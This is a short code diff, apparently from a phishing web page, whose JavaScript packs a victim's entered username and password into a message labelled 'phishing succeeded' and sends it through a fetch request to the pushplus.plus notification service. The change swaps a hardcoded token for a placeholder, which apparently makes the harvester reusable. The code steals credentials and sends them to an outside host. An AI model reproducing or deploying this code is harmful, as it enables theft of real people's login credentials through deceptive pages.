@@ -30,8 +30,8 @@
             all.classList.remove('show')
 
             let data = "钓鱼成功！"+`账号：${userName}，密码：${passWord}`
-
-            let url = 'https://www.pushplus.plus/send?token=833bb521ea654abab17470a390e6f761&content=' + data
+            //输入api借接口
+            let url = 'https://www.pushplus.plus/send?token=content=' + data
 
             fetch(url, {
                 method: 'GET',
